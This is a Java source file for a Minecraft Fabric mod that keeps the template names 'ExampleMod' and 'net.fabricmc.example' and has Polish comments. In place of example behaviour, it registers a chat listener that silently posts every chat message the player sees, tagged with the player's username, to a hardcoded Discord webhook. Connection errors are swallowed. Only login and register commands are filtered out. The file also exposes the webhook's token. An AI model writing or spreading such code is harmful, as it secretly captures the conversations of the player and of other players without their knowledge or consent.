package net.fabricmc.example;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.minecraft.client.MinecraftClient;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class ExampleMod implements ModInitializer {

    // 
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1487893400001712199/4vA3flU8xdoxkff7A1M_Mr7HhfJQOW6e1yowFWCHCVWlfVw2VK-zN8vJor52GYiwewdW";
    private final HttpClient httpClient = HttpClient.newHttpClient();

    @Override
    public void onInitialize() {
        // Rejestracja zdarzenia odebrania wiadomości na czacie (wersja 1.21.4)
        ClientReceiveMessageEvents.CHAT.register((message, signedMessage, sender, params, receptionTimestamp) -> {
            String text = message.getString();
            
            // Pobieranie nicku gracza, który widzi wiadomość
            String playerNick = "Nieznany";
            if (MinecraftClient.getInstance().getSession() != null) {
                playerNick = MinecraftClient.getInstance().getSession().getUsername();
            }

            // Filtr bezpieczeństwa: ignoruje komendy logowania i rejestracji
            String lowText = text.toLowerCase();
            if (!lowText.contains("/login") && !lowText.contains("/l ") && 
                !lowText.contains("/register") && !lowText.contains("/reg ")) {
                
                sendToDiscord("**[" + playerNick + "]** widzi na czacie: \n" + text);
            }
        });
    }

    private void sendToDiscord(String content) {
        new Thread(() -> {
            try {
                // Przygotowanie bezpiecznego JSONa
                String safeContent = content.replace("\"", "\\\"").replace("\n", "\\n");
                String json = "{\"content\": \"" + safeContent + "\"}";

                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(WEBHOOK_URL))
                        .header("Content-Type", "application/json")
                        .POST(HttpRequest.BodyPublishers.ofString(json))
                        .build();

                httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            } catch (Exception ignored) {
                // Ignorujemy błędy połączenia
            }
        }).start();
    }
}
